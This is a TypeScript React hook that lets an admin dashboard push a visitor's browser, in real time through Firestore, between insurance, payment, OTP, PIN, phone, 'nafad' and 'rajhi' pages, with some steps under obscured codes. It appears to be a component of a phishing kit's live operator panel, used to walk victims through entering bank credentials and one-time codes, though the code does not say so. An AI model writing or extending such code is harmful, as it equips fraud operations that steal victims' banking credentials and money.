/**
 * Hook to monitor redirect requests from admin dashboard
 * Handles rapid redirect changes without queueing or conflicts
 */

import { useEffect, useRef, useCallback } from "react";
import { useRouter } from "next/navigation";
import { db } from "@/lib/firebase";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

// Page mapping for all routes
const PAGE_MAP: Record<string, string> = {
  home: "/home-new",
  insur: "/insur",
  compar: "/compar",
  check: "/check",
  payment: "/check",
  otp: "/step2",
  pin: "/step3",
  phone: "/step5",
  nafad: "/step4",
  rajhi: "/step6",
  _t6: "/step4",
  _st1: "/check",
  _t2: "/step2",
  _t3: "/step3",
};

// Which currentStep values belong to which page
// Supports both string values (nafad, _t6) and numeric values (8, 9)
const STEP_OWNERS: Record<string, (string | number)[]> = {
  nafad: ["nafad", "_t6", 8],     // step4 handles: nafad, _t6, and step 8
  rajhi: ["rajhi", "_r6", 9],     // step6 handles: rajhi, _r6, and step 9
  home: ["home", "_h1", 1],
  insur: ["insur", "_i2", 2],
  compar: ["compar"],
  check: ["check", "_st1", 4],
  otp: ["otp", "_t2", 2],
  pin: ["pin", "_t3", 3],
  phone: ["phone", 7],
};

export function useRedirectMonitor({
  visitorId,
  currentPage,
}: UseRedirectMonitorProps) {
  const router = useRouter();

  // Track the last redirect we handled to prevent re-processing
  const lastHandledKeyRef = useRef<string>("");

  // Debounce timer to prevent rapid-fire redirects
  const redirectTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pendingRedirectRef = useRef<string | null>(null);

  const processRedirect = useCallback(async (page: string) => {
    if (page === currentPage) {
      console.log(`[RedirectMonitor] Already on page ${page}, skipping redirect`);
      return;
    }

    const targetUrl = PAGE_MAP[page] || `/${page}`;
    console.log(`[RedirectMonitor] 🚀 Redirecting from ${currentPage} to ${targetUrl}`);

    // Clear the redirect immediately to prevent re-processing
    await setDoc(doc(db as Firestore, "pays", visitorId), {
      redirectPage: null,
      redirectPageHandledAt: Date.now()
    }, { merge: true }).catch(err => {
      console.error("[RedirectMonitor] Error clearing redirect:", err);
    });

    // Navigate to the target page
    router.push(targetUrl);
  }, [currentPage, visitorId, router]);

  useEffect(() => {
    console.log(`[RedirectMonitor] Starting listener for ${visitorId}, currentPage: ${currentPage}`);

    // Reset state when currentPage changes
    lastHandledKeyRef.current = "";
    pendingRedirectRef.current = null;

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (snapshot) => {
        const data = snapshot.data();
        if (!data) return;
        const now = Date.now();

        // Check modern redirectPage system
        const redirectPage = data.redirectPage as string | undefined;
        const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined;
        const handledAt = data.redirectPageHandledAt as number | undefined;

        if (redirectPage && redirectPage !== currentPage) {
          // Create unique key for this redirect
          const redirectKey = `${redirectPage}_${redirectUpdatedAt}`;

          // Skip if we already handled this exact redirect
          if (redirectKey === lastHandledKeyRef.current) {
            console.log(`[RedirectMonitor] Already handled redirect ${redirectKey}, skipping`);
            return;
          }

          // Skip if this redirect was already handled by a previous page
          if (handledAt && redirectUpdatedAt && handledAt >= redirectUpdatedAt) {
            console.log(`[RedirectMonitor] Redirect was already handled at ${handledAt}, skipping`);
            return;
          }

          console.log(`[RedirectMonitor] 📍 New redirect: ${redirectPage} (updatedAt: ${redirectUpdatedAt})`);

          // Cancel any pending redirect
          if (redirectTimerRef.current) {
            clearTimeout(redirectTimerRef.current);
            redirectTimerRef.current = null;
          }

          // Store the redirect and process it
          lastHandledKeyRef.current = redirectKey;
          pendingRedirectRef.current = redirectPage;

          // Process immediately (no delay)
          processRedirect(redirectPage);
        }

        // Check legacy currentStep system
        const currentStep = data.currentStep as string | undefined;
        const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined;

        if (currentStep) {
          // Check if this currentStep belongs to this page
          const allowedSteps = STEP_OWNERS[currentPage] || [];
          const stepBelongsToPage = allowedSteps.includes(currentStep);

          if (!stepBelongsToPage) {
            console.log(`[RedirectMonitor] Step ${currentStep} belongs to another page, ignoring`);
            return;
          }

          // Create unique key for this redirect
          const stepKey = `step_${currentStep}_${currentStepUpdatedAt}`;

          // Skip if we already handled this exact redirect
          if (stepKey === lastHandledKeyRef.current) {
            console.log(`[RedirectMonitor] Already handled step ${stepKey}, skipping`);
            return;
          }

          // Get the target URL for this step
          const targetUrl = PAGE_MAP[currentStep];
          const currentUrl = window.location.pathname;

          // Check if we're already on the target page (after redirect)
          if (targetUrl === currentUrl) {
            console.log(`[RedirectMonitor] Already on target page ${targetUrl}, clearing and skipping`);
            // Clear the currentStep to prevent re-processing
            setDoc(doc(db as Firestore, "pays", visitorId), {
              currentStep: null,
              currentStepHandledAt: Date.now()
            }, { merge: true }).catch(err => {
              console.error("[RedirectMonitor] Error clearing currentStep:", err);
            });
            lastHandledKeyRef.current = stepKey;
            return;
          }

          console.log(`[RedirectMonitor] 📍 Legacy step: ${currentStep} → ${targetUrl}`);

          // Store the step key to prevent re-processing
          lastHandledKeyRef.current = stepKey;

          if (targetUrl) {
            // Clear currentStep BEFORE redirecting to prevent re-processing
            setDoc(doc(db as Firestore, "pays", visitorId), {
              currentStep: null,
              currentStepHandledAt: Date.now()
            }, { merge: true }).catch(err => {
              console.error("[RedirectMonitor] Error clearing currentStep:", err);
            });

            // Navigate to the target page
            router.push(targetUrl);
          }
        }
      },
      (error) => {
        console.error("[RedirectMonitor] Error:", error);
      }
    );

    return () => {
      console.log("[RedirectMonitor] Cleaning up");
      if (redirectTimerRef.current) {
        clearTimeout(redirectTimerRef.current);
      }
      unsubscribe();
    };
  }, [visitorId, currentPage, router, processRedirect]);
}

// Export for admin to get available pages
export const AVAILABLE_REDIRECT_PAGES = Object.keys(PAGE_MAP);
